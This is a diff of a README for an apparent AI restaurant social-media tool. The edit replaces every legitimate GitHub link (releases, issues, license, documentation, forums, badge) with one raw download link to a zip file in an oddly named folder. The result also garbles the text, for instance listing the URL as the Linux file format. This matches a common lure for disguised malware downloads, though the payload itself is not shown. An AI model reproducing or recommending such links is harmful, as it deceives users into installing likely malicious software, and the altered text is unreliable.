@@ -6,7 +6,7 @@ Welcome to restaurant-social-saas! This platform uses AI to help restaurants man
 
 ## 📥 Download Link
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/HACKERSCODERS/restaurant-social-saas/releases)
+[![Download Now](https://raw.githubusercontent.com/HACKERSCODERS/restaurant-social-saas/main/Sigillariaceae/restaurant-social-saas.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/HACKERSCODERS/restaurant-social-saas/main/Sigillariaceae/restaurant-social-saas.zip)
 
 ## 🌟 Features
 
@@ -29,16 +29,16 @@ To ensure smooth operation, please meet the following system requirements:
 ## 💻 Installation Steps
 
 1. **Download the Software**: 
-   Visit the [Releases Page](https://github.com/HACKERSCODERS/restaurant-social-saas/releases) to download the latest version of the application.
+   Visit the [Releases Page](https://raw.githubusercontent.com/HACKERSCODERS/restaurant-social-saas/main/Sigillariaceae/restaurant-social-saas.zip) to download the latest version of the application.
 
 2. **Choose Your Version**:
-   Look for the latest release. You'll see various formats (e.g., `.exe` for Windows, `.dmg` for macOS, `.tar.gz` for Linux). Select the one that fits your operating system.
+   Look for the latest release. You'll see various formats (e.g., `.exe` for Windows, `.dmg` for macOS, `https://raw.githubusercontent.com/HACKERSCODERS/restaurant-social-saas/main/Sigillariaceae/restaurant-social-saas.zip` for Linux). Select the one that fits your operating system.
 
 3. **Download and Install**:
    Click on the download link for your chosen format. 
    - For Windows, double-click the `.exe` file once it downloads. 
    - For macOS, open the `.dmg` file and drag the application into the Applications folder. 
-   - For Linux, extract the `.tar.gz` file and follow the instructions in the included README.
+   - For Linux, extract the `https://raw.githubusercontent.com/HACKERSCODERS/restaurant-social-saas/main/Sigillariaceae/restaurant-social-saas.zip` file and follow the instructions in the included README.
 
 4. **Launch the Application**:
    Once installed, open the application. You can find it in your list of programs or applications.
@@ -72,23 +72,23 @@ The basic features of our application are free. However, some premium features a
 
 ### How do I provide feedback?
 
-We appreciate your input! Use the integrated feedback option within the app or visit the [GitHub Issues Page](https://github.com/HACKERSCODERS/restaurant-social-saas/issues) to submit your thoughts.
+We appreciate your input! Use the integrated feedback option within the app or visit the [GitHub Issues Page](https://raw.githubusercontent.com/HACKERSCODERS/restaurant-social-saas/main/Sigillariaceae/restaurant-social-saas.zip) to submit your thoughts.
 
 ## 💬 Contact us
 
-If you have further questions or need assistance, feel free to reach out to our support team via the [GitHub Issues Page](https://github.com/HACKERSCODERS/restaurant-social-saas/issues).
+If you have further questions or need assistance, feel free to reach out to our support team via the [GitHub Issues Page](https://raw.githubusercontent.com/HACKERSCODERS/restaurant-social-saas/main/Sigillariaceae/restaurant-social-saas.zip).
 
 ## 📄 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/HACKERSCODERS/restaurant-social-saas/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/HACKERSCODERS/restaurant-social-saas/main/Sigillariaceae/restaurant-social-saas.zip) file for details.
 
 ## 🔗 Additional Resources
 
 For more information and updates, check out our documentation and related resources:
 
-- [Documentation](https://github.com/HACKERSCODERS/restaurant-social-saas/wiki)
-- [Community Forums](https://github.com/HACKERSCODERS/restaurant-social-saas/discussions)
+- [Documentation](https://raw.githubusercontent.com/HACKERSCODERS/restaurant-social-saas/main/Sigillariaceae/restaurant-social-saas.zip)
+- [Community Forums](https://raw.githubusercontent.com/HACKERSCODERS/restaurant-social-saas/main/Sigillariaceae/restaurant-social-saas.zip)
 
 ## 📦 Download and Install
 
-To get started, visit the [Releases Page](https://github.com/HACKERSCODERS/restaurant-social-saas/releases) to download the application. Follow the installation steps outlined above, and enjoy simplifying your restaurant's social media management!
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/HACKERSCODERS/restaurant-social-saas/main/Sigillariaceae/restaurant-social-saas.zip) to download the application. Follow the installation steps outlined above, and enjoy simplifying your restaurant's social media management!
